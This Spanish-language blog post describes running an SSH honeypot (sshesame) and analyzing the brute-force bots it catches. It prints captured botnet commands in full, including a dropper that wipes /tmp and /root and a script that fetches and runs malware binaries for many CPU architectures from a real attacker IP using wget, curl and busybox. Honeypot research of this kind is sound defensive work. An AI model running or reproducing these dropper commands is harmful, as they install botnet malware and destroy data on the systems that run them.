---
layout: single
title: "Dejé mi SSH vulnerable a propósito, acá están los resultados"
excerpt: "Análisis de un honeypot SSH, exploración de bots y malware, ingeniería inversa y mejores prácticas para proteger tu servidor."
date: 2025-03-08
classes: wide
header:
  teaser: /assets/images/ssh_expuesto/ssh_expuesto_icon.jpg
  teaser_home_page: true
  icon: 
categories:
  - Hacking
  - Seguridad en Servidores
  - Ingeniería Inversa
tags:
  - SSH
  - Botnets
  - Malware
  - Pentesting
  - Hardening
---  

![](/assets/images/ssh_expuesto/comic.jpg)


**_Un poco de contexto antes..._**

Hace poco, estábamos en Discord con unos amigos y pintó la idea de armar un servidor de Minecraft. (Spoiler: jugamos nueve días y lo abandonamos, ja). Hasta ahí todo bien. Bajamos el instalador del servidor de Mojang y lo pusimos a correr en una Raspberry Pi 4.

Para que ellos pudieran conectarse, tenía que hacer **Port Forwarding**, que básicamente es abrir un puerto en el router y redirigir todo el tráfico que llegue a ese puerto hacia la Raspberry. Esto permite que un dispositivo dentro de tu red local sea accesible desde Internet, en este caso, el servidor de Minecraft.

Para poder manejar la Raspi y hacer otras cosas, necesitaba tener el SSH activo. Sobre todo, porque a veces no estaba en casa y no tenía una forma fácil de administrarla. Así que hice otro **Port Forwarding**, redirigiendo el puerto 22 del router al 22 de la Raspi, al inicio todo bien, hasta que...

## **La primera señal de alerta**
---

![](/assets/images/ssh_expuesto/360_F_261614394_xe8QkT2BnQNTHnyRPdQRAooBDszNB9By.jpg)

Tengo la costumbre de revisar los logs del sistema para monitorear el rendimiento, el consumo y otros detalles. Mientras usaba `journalctl` para analizar algunos registros, noté algo extraño: había intentos de conexión que yo no había realizado. Intrigado, fui directo al `auth.log`.

### **Esto fue lo que encontré**:

![](/assets/images/ssh_expuesto/login_atemptts.png)

Al principio no me sorprendió demasiado. Cualquier cosa que pongas en Internet, tarde o temprano, va a ser atacada. Ahora, ¿todas estas conexiones son de hackers? Sí... pero no. No es que haya alguien detrás de una pantalla intentando adivinar mi contraseña, sino que son bots programados para hacer ese laburo.

¿Y cómo sé que son bots? Bueno, tomé una de las IPs del log, por ejemplo, la 89.252.140.204, y la busqué con `grep`. Esto es lo que apareció...

![](/assets/images/ssh_expuesto/es_bot.png)
 
Si miramos el timestamp del log, vemos que los intentos de conexión ocurren en intervalos de apenas unos segundos. Esto es un claro indicio de que podría tratarse de un bot. Otros factores que también tomo en cuenta son:
- Que distintas IPs intenten acceder con los mismos usuarios.
- Que las IPs provengan de distintos países.

Antes de meter mano para solucionar el problema, me picó la curiosidad: ¿qué pasaría si uno de estos bots lograra encontrar un usuario y contraseña válida? Para averiguarlo, decidí investigar...


## **Honeypots** 
---

![](/assets/images/ssh_expuesto/8986df49-cbb7-43d8-aac0-1de7de18cb57.jpg)


Antes de seguir, quiero introducir el concepto de **Honeypot** (Punto Dulce). Básicamente, un honeypot es un servidor que tiene vulnerabilidades intencionales, diseñado para atraer a los atacantes y analizar sus acciones. Es como un "cebo" que, al estar expuesto, permite estudiar cómo los hackers intentan explotarlas y, con esa información, mejorar la seguridad de un servidor o dispositivo.

¿Y por qué se le llama "Honeypot" o "Punto Dulce"? Bueno, la idea viene de la analogía con la miel: los atacantes, como las moscas o los insectos, se sienten atraídos por la "dulzura" de una vulnerabilidad fácil de explotar. Este "punto dulce" actúa como una trampa para poder observar y aprender sin que el atacante se dé cuenta de que está siendo vigilado.

Bueno, lo que más me interesaba era descubrir qué contraseñas usaban estos bots y qué hacían una vez dentro del equipo. Lo primero que se me vino a la cabeza fue el proyecto **[sshesame](https://github.com/jaksi/sshesame)**, desarrollado por [Kristof Jakab](https://github.com/jaksi). Básicamente, este proyecto simula un servidor SSH falso: da la sensación de que la conexión es real y de que se obtiene una shell, pero en realidad es solo un simulador.

Algo como esto: 


<video width="980" height="720" controls="controls">
  <source src="/assets/images/ssh_expuesto/prueba_honypotssh.mp4" type="video/mp4">
</video>

## ¿Como podemos instalar este Honypot? 

Para instalar **Sshesame** y usarlo como honeypot SSH, te dejo una guía paso a paso:

### **1. Instalación desde el código fuente**

Si preferís compilarlo vos mismo, seguí estos pasos:

- **Cloná el repositorio**:  
    Abrí la terminal y ejecutá:
    
    ```bash
    git clone https://github.com/jaksi/sshesame.git
    ```
    
- **Accedé a la carpeta** del repositorio:
    
    ```bash
    cd sshesame
    ```
    
- **Compilalo**:  
    Si tenés Go instalado, simplemente ejecutá:
    
    ```bash
    go build
    ```
    

### **2. Instalación usando Docker**

Si preferís una opción más fácil con Docker, segui estos pasos:

- **Corriendo el contenedor con Docker**:  
    En la terminal, ejecutá:
    
    ```bash
    docker run -it --rm \
        -p 127.0.0.1:2022:2022 \
        -v sshesame-data:/data \
        [-v $PWD/sshesame.yaml:/config.yaml] \
        ghcr.io/jaksi/sshesame
    ```
    
    Asegurate de tener Docker instalado y funcionando correctamente. Esto abrirá el puerto 2022 en tu localhost, y podrás ver los logs de las conexiones que hagan los bots al honeypot.
    

### **3. Instalación usando Docker Compose**

Si preferís usar **Docker Compose**, podés usar este archivo de configuración:

```yaml
services:
  sshesame:
    image: ghcr.io/jaksi/sshesame
    ports:
      - "127.0.0.1:2022:2022"
    volumes:
      - sshesame-data:/data
      #- ./sshesame.yaml:/config.yaml
volumes:
  sshesame-data: {}
```

Guardá el archivo como `docker-compose.yml` y después ejecutá:

```bash
docker-compose up -d
```

### **4. Instalación con systemd (opcional)**

Si preferís que **sshesame** se ejecute como servicio en tu sistema, podés crear un archivo systemd con esta configuración:

```ini
[Unit]
Description=SSH honeypot
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/path/to/sshesame #-config /path/to/sshesame.yaml
Restart=always

[Install]
WantedBy=multi-user.target
```

Guardá este archivo como `/etc/systemd/system/sshesame.service`, luego recargá systemd y habilitá el servicio:

```bash
sudo systemctl daemon-reload
sudo systemctl enable sshesame
sudo systemctl start sshesame
```

### **5. Configuración**

Podés usar un archivo de configuración opcional para personalizar el comportamiento de **sshesame**. Si no lo especificás, el programa generará configuraciones por defecto.

Para especificar un archivo de configuración:

```bash
sshesame -config /ruta/a/sshesame.yaml
```

Si les interesa la Config que use para esto, procedo a adjuntarla:
https://raw.githubusercontent.com/J0elBermud3z/dotfiles/refs/heads/master/honeypot/sshesame/sshesame.yaml

En este caso lo que hace mi Config, es poner a escuchar en todas las interfaces de red y abrir el falso ssh por el puerto 22 y guardar los Logs en /var/log/fake_ssh (es importante antes crear el archivo).

### **6. Ver los logs de actividad**

Una vez que tengas todo configurado y funcionando, **sshesame** empezará a registrar las conexiones de los bots. Los logs se mostrarán por defecto en la salida estándar (stdout). Si configuraste un archivo de logs, se guardarán en el lugar indicado.

Ejemplo de log:

```
2021/07/04 00:37:07 [127.0.0.1:64515] authentication for user "jaksi" with password "hunter2" accepted
2021/07/04 00:37:07 [127.0.0.1:64515] [channel 1] input: "cat /etc/passwd"
2021/07/04 00:37:17 [127.0.0.1:64515] [channel 1] closed
```

## Volviendo...
---

Una vez que tuve **sshesame** corriendo y configurado, lo que hice fue dejar que el honeypot se encargara de recibir esas conexiones y registrar todo. No pasó mucho tiempo hasta que comenzaron a aparecer los primeros intentos de acceso en los logs.

![](/assets/images/ssh_expuesto/logs.png)

La primera impresión que tuve fue que esos bots eran extremadamente persistentes, intentando una y otra vez con diferentes combinaciones de usuarios y contraseñas. 

Una de las acciones más interesantes que tomé fue aplicar el siguiente comando para analizar las contraseñas más frecuentes:

```
awk -F ":" '/password/ { gsub(/}}|"/, ""); gsub(/\r/, ""); print $NF }' fake_ssh | sort | uniq -c | sort -nr | head -n 3
```

Este comando me permite obtener el top 3 de las contraseñas más utilizadas, lo que me ayudó a identificar rápidamente las que los bots estaban utilizando para intentar acceder al sistema.

![](/assets/images/ssh_expuesto/proff.png)

Lo más curioso fue que **todos los intentos parecían seguir patrones similares**: trataban de ingresar con contraseñas comunes como **"root"**, **"admin"**, **"123456"**, e incluso con contraseñas complejas como **"kjashd123sadhj123dhs1SS"**, las cuales claramente indican que están siendo utilizadas por bots que intentan explotar servidores vulnerables.

Pero, por que **"kjashd123sadhj123dhs1SS"**? Como pueden ver la misma se intento usar un total de **225** veces, como la curiosidad me gano, fui a nuestro amigo de confianza Google. 

Estos fueron los resultados:

![](/assets/images/ssh_expuesto/busqueda_en_google.png)

En el hilo de Reddit lo que sugiere es un simple ataque de fuerza bruta mal configurado. Este tipo de contraseñas complejas es común en intentos automatizados de bots para adivinar combinaciones de acceso. También se observó que algunos intentos utilizaban claves públicas aleatorias, lo cual es raro, ya que un servidor SSH mal asegurado podría aceptarlas. Puedes leer más en el [post original](https://www.reddit.com/r/selfhosted/comments/1dgf01t/24_hours_of_running_an_ssh_honeypot/?tl=es-es).
 
## Volviendo a los logs...
---

Busqué en Internet si estas IPs ya habían sido reportadas anteriormente, y efectivamente, varias de ellas ya estaban marcadas como maliciosas.


![](/assets/images/ssh_expuesto/ip_mala.png)


Ahora bien, lo interesante: ¿Qué tratan de hacer estos bots cuando logran acceder al honeypot? Para averiguarlo, decidí analizar los logs de actividad y aplicar el siguiente comando:
```cat fake_ssh | jq | grep "command"``` el resultado fue el siguiente: 

![](/assets/images/ssh_expuesto/ataques_de_malwere.png)


Bien, esto es mucho, así que voy a ir un poco por partes. ¿Qué están tratando de hacer estos bots? Un claro ejemplo es el siguiente comando que encontré en los logs de actividad:

```bash
cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.92/bins.sh; curl -O http://37.44.238.92/bins.sh;/bin/busybox wget http://37.44.238.92/bins.sh; chmod 777 bins.sh; ./bins.sh; sh bins.sh; rm bins.sh
```

Ahora, desglosémoslo para entender qué está pasando acá:

1. **`cd /tmp; rm -rf /tmp/*`**: El bot comienza intentando acceder al directorio temporal (`/tmp`) y borrar todos los archivos dentro de él. Esto podría ser para eliminar archivos de rastreo o cualquier artefacto dejado por su actividad.
    
2. **`|| cd /var/run || cd /mnt || cd /root`**: Si no puede borrar `/tmp`, intenta cambiar a otros directorios como `/var/run`, `/mnt` o `/root`. Estos son directorios importantes donde podría encontrar archivos útiles para lo que está buscando.
    
3. **`rm -rf /root/*`**: Si llega al directorio `/root`, también intenta eliminar todos los archivos allí, lo que puede ser para destruir datos o borrar cualquier evidencia de su presencia.
    
4. **`cd /; wget http://37.44.238.92/bins.sh; curl -O http://37.44.238.92/bins.sh`**: Después, se mueve a la raíz del sistema (`/`) y usa `wget` o `curl` para descargar un archivo desde un servidor externo (en este caso, `http://37.44.238.92/bins.sh`). Este archivo probablemente sea malicioso y contenga un script o payload, lo vamos a estar analizando mas adelante.
    
5. **`/bin/busybox wget http://37.44.238.92/bins.sh`**: Acá usa `busybox`, una herramienta común en sistemas embebidos o con pocos recursos, para volver a descargar el mismo archivo. Esto muestra que el bot tiene métodos redundantes para asegurar que el archivo malicioso llegue.
    
6. **`chmod 777 bins.sh; ./bins.sh; sh bins.sh`**: Luego, cambia los permisos del archivo descargado (`bins.sh`) para poder ejecutarlo con todos los privilegios (`chmod 777`), y lo ejecuta con `./bins.sh` o `sh bins.sh`. Esto hace que el script malicioso se ejecute.
    
7. **`rm bins.sh`**: Finalmente, después de ejecutar el script malicioso, borra el archivo descargado (`bins.sh`), lo que ayuda a eliminar cualquier rastro y complica la detección.
    

Este tipo de comandos muestra que el bot está intentando comprometer aún más el servidor, probablemente para instalar algún malware o establecer un punto de acceso persistente desde donde pueda seguir controlando el equipo. Además, parece que está intentando **ocultar sus huellas** y **eliminar evidencia** para que no se detecte tan fácilmente (están muy pillos con esto).



## 37.44.238.92
---

![](/assets/images/ssh_expuesto/hacker_server.png)

Como vimos en los Logs, el Bot intenta descargar recursos desde su servidor. En un principio, pensé en enumerarlo un poco más, pero recordé que, por más que se trate de un servidor de un Cibercriminal, sigue siendo un servidor ajeno, y realizar esa enumeración podría ser ilegal.

Por esa razón, decidí limitar un poco mi curiosidad y no adentrarme en más detalles y limitarme a descargar los scripts que los bots intentan obtener.

Descargamos el archivo, en mi caso lo voy a hacer con un `wget`:

![](/assets/images/ssh_expuesto/download_malwere.png)

Ahora, ¿qué hay dentro de este `.sh`? Bueno, una vez que lo descargamos, la pregunta es qué tipo de acciones realiza el script. Para averiguarlo, lo primero que hice fue abrir el archivo y revisar su contenido. ¿Qué estaba tratando de ejecutar este script malicioso?

```bash
#!/bin/bash
PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin
/bin/rm bins.sh
wget http://37.44.238.92/bins/tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G; curl -O  http://37.44.238.92/bins/tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G;/bin/busybox wget http://37.44.238.92/bins/tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G; chmod 777 tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G; ./tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G;rm tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G ##sh4

wget http://37.44.238.92/bins/59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv; curl -O  http://37.44.238.92/bins/59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv;/bin/busybox wget http://37.44.238.92/bins/59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv; chmod 777 59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv; ./59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv;rm 59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv ##m68k

wget http://37.44.238.92/bins/l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E; curl -O  http://37.44.238.92/bins/l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E;/bin/busybox wget http://37.44.238.92/bins/l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E; chmod 777 l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E; ./l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E;rm l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E ##i686

wget http://37.44.238.92/bins/1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki; curl -O  http://37.44.238.92/bins/1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki;/bin/busybox wget http://37.44.238.92/bins/1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki; chmod 777 1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki; ./1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki;rm 1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki ##powerpc

wget http://37.44.238.92/bins/z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr; curl -O  http://37.44.238.92/bins/z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr;/bin/busybox wget http://37.44.238.92/bins/z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr; chmod 777 z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr; ./z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr;rm z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr ##armv6l

wget http://37.44.238.92/bins/kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX; curl -O  http://37.44.238.92/bins/kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX;/bin/busybox wget http://37.44.238.92/bins/kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX; chmod 777 kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX; ./kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX;rm kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX ##armv5l

wget http://37.44.238.92/bins/MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA; curl -O  http://37.44.238.92/bins/MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA;/bin/busybox wget http://37.44.238.92/bins/MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA; chmod 777 MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA; ./MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA;rm MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA ##mips

wget http://37.44.238.92/bins/y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q; curl -O  http://37.44.238.92/bins/y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q;/bin/busybox wget http://37.44.238.92/bins/y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q; chmod 777 y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q; ./y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q;rm y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q ##mipsel

wget http://37.44.238.92/bins/wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR; curl -O  http://37.44.238.92/bins/wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR;/bin/busybox wget http://37.44.238.92/bins/wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR; chmod 777 wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR; ./wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR;rm wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR ##i586

wget http://37.44.238.92/bins/MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75; curl -O  http://37.44.238.92/bins/MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75;/bin/busybox wget http://37.44.238.92/bins/MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75; chmod 777 MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75; ./MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75;rm MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75 ##armv4l

wget http://37.44.238.92/bins/j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f; curl -O  http://37.44.238.92/bins/j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f;/bin/busybox wget http://37.44.238.92/bins/j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f; chmod 777 j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f; ./j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f;rm j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f ##powerpc-440fp

wget http://37.44.238.92/bins/7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa; curl -O  http://37.44.238.92/bins/7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa;/bin/busybox wget http://37.44.238.92/bins/7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa; chmod 777 7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa; ./7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa;rm 7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa ##sparc

wget http://37.44.238.92/bins/qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb; curl -O  http://37.44.238.92/bins/qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb;/bin/busybox wget http://37.44.238.92/bins/qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb; chmod 777 qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb; ./qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb;rm qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb ##x86_64

wget http://37.44.238.92/bins/ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q; curl -O  http://37.44.238.92/bins/ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q;/bin/busybox wget http://37.44.238.92/bins/ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q; chmod 777 ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q; ./ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q;rm ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q ##armv7l

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75; curl -O  http://37.44.238.92/bins/MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75;/bin/busybox wget http://37.44.238.92/bins/MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75; chmod 777 MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75; ./MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75;rm MCWmH8qLGsVQZzvbYfRMovyxDSv25KlH75 ##armv4l

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA; curl -O  http://37.44.238.92/bins/MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA;/bin/busybox wget http://37.44.238.92/bins/MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA; chmod 777 MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA; ./MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA;rm MDukejRpEVRJtAF8qJOUHxMH7xLDBBSPzA ##mips

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q; curl -O  http://37.44.238.92/bins/y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q;/bin/busybox wget http://37.44.238.92/bins/y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q; chmod 777 y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q; ./y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q;rm y4cOM46uRtKFAfg7vowXnJ6sPSo9YtWU4q ##mipsel

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR; curl -O  http://37.44.238.92/bins/wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR;/bin/busybox wget http://37.44.238.92/bins/wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR; chmod 777 wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR; ./wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR;rm wk7VTKwCVeEQJUdhBBXEYBpypx8AKzXuTR ##i586

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q; curl -O  http://37.44.238.92/bins/ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q;/bin/busybox wget http://37.44.238.92/bins/ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q; chmod 777 ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q; ./ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q;rm ObtRzbXMZ0GLfCR0BK23moxR4k1LgUKj5Q ##armv7l

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f; curl -O  http://37.44.238.92/bins/j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f;/bin/busybox wget http://37.44.238.92/bins/j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f; chmod 777 j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f; ./j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f;rm j5pF2uRAfRIrxFbSnk6Wcqg8sFoHfAcw0f ##powerpc-440fp

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa; curl -O  http://37.44.238.92/bins/7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa;/bin/busybox wget http://37.44.238.92/bins/7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa; chmod 777 7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa; ./7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa;rm 7QHC5pMEH9TTTNrssZuZWwCur8ig80hgfa ##sparc

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb; curl -O  http://37.44.238.92/bins/qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb;/bin/busybox wget http://37.44.238.92/bins/qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb; chmod 777 qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb; ./qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb;rm qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb ##x86_64

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki; curl -O  http://37.44.238.92/bins/1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki;/bin/busybox wget http://37.44.238.92/bins/1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki; chmod 777 1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki; ./1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki;rm 1Url4Vmjm3jutDoL4IALrwVcTgwtmfdAki ##powerpc

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G; curl -O  http://37.44.238.92/bins/tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G;/bin/busybox wget http://37.44.238.92/bins/tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G; chmod 777 tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G; ./tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G;rm tCV5vO5tw9z8XJnNLCPzh9rWcP75X3gc4G ##sh4

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv; curl -O  http://37.44.238.92/bins/59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv;/bin/busybox wget http://37.44.238.92/bins/59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv; chmod 777 59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv; ./59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv;rm 59fT4e3UEmL9oGFEi4nhEPDL9v4liwzVzv ##m68k

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E; curl -O  http://37.44.238.92/bins/l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E;/bin/busybox wget http://37.44.238.92/bins/l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E; chmod 777 l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E; ./l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E;rm l8bIo6MX0E2xzUa8GlxxB3QQT28nJjEe7E ##i686

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX; curl -O  http://37.44.238.92/bins/kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX;/bin/busybox wget http://37.44.238.92/bins/kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX; chmod 777 kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX; ./kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX;rm kcZ7wDS9Ey1472EBe1Yh1UdgSWJCDpmXmX ##armv5l

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.92/bins/z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr; curl -O  http://37.44.238.92/bins/z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr;/bin/busybox wget http://37.44.238.92/bins/z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr; chmod 777 z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr; ./z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr;rm z9GdbmiPoT1CYXtsXr4DYxGfZQoAwH2Upr ##armv6l
```

Este script tiene un comportamiento bastante claro: intenta descargar y ejecutar un binario dependiendo de la arquitectura del sistema. Básicamente, lo que hace es:

1. **"""""Detectar"""""" la arquitectura del sistema**: A partir de la IP y el comando de descarga (`wget`, `curl`), se descargan binarios específicos para distintas arquitecturas (MIPS, x86, ARM, PowerPC, etc.).

2. **Dar permisos de ejecución**: Después de descargar el archivo, le otorgan permisos de ejecución usando `chmod 777`.

3. **Ejecutar el binario descargado**: Tras asegurarse de que el binario tiene permisos, lo ejecutan (`./<binario>`).

4. **Eliminar el archivo**: Una vez que el binario ha sido ejecutado, el script borra el archivo descargado con `rm`, eliminando cualquier rastro de su presencia en el sistema.

En mi caso, estoy usando una Raspberry Pi con arquitectura **aarch64**, la busque en el Script y la misma no estaba.

Como aún me sigue picando más la curiosidad, busqué el binario para otra arquitectura en este caso para  la x86_64, me lo descargué para tratar de hacerle un poco de Reversing. Quiero destacar que el Cibercriminal que hizo este Malware ni se molesto en comprobar la arquitectura correcta para instalar el binario/Malware correcto, simplemente se limito a "Tirar a matar". 

## Ingeniera inversa básica al Malware


_**[ ! ] Este es un análisis básico.**_

